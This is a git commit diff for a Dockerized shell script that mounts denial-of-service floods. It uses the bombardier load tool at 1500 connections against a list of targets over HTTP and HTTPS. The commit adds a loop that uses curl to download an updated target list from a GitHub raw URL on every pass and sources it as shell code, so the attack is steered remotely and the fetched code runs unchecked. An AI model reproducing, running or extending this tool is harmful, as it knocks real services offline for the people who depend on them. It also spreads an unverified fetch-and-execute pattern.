314533842d94c4d02c6683c75c072d1b7067c5c0
Vlad Kolbaia <vlad.kolbaia@gmail.com>
2022-03-03 13:57:32 +0200

    Self-updating version - release

--- Dockerfile
+++ Dockerfile
@@ -2,6 +2,12 @@ FROM golang:latest
 
 RUN go install github.com/codesenberg/bombardier@latest
 
-COPY ./fuckputin.sh .
+# Prepare for install
+RUN apt-get update -y && apt-get upgrade -y
+
+# Get all needed binaries
+RUN apt-get install curl -y
+
+COPY . .
 
 CMD ./fuckputin.sh
--- fuckputin-local.sh
+++ fuckputin-local.sh
@@ -2,15 +2,32 @@
 
 . ./fucklist.sh
 
-for n in {1..100}; do 
-    for i in "${fucklist[@]}"
+list=("${fucklist[@]}")
+
+for n in {1..1000}; do 
+    for (( i = 0; i < ${#list[@]}; i++ )) 
         do
-        echo "Fucking - $i"
-        ./bombardier -c 1000 -d 60s -l http://$i --http1
+        
+        # DDoS
+        echo "Fucking - ${list[i]}"
+        ./bombardier -c 1500 -d 5s -l http://${list[i]} --http1
         echo "Switching to https"
-        ./bombardier -c 1000 -d 60s -l https://$i --http1
-        echo "Fucked - $i"
-        sleep 5
+        sleep 2
+        ./bombardier -c 1500 -d 5s -l https://${list[i]} --http1
+        echo "Fucked - ${list[i]}"
+        sleep 2
+        
+        # Fetch and load new fucklist into memory
+        echo "Fetching new fucklist..."
+        curl -LJO  https://raw.githubusercontent.com/v1adko/fuckputin/master/fucklist.sh
+        sleep 1
+        . ./fucklist.sh
+
+        #  If it's different from the current list - restart the queue
+        if [ "${list[0]}" != "${fucklist[0]}" ]; then
+            echo "Fetched new fucklist, restarting..."
+            list=("${fucklist[@]}")
+            i=-1
+        fi
     done
 done
-
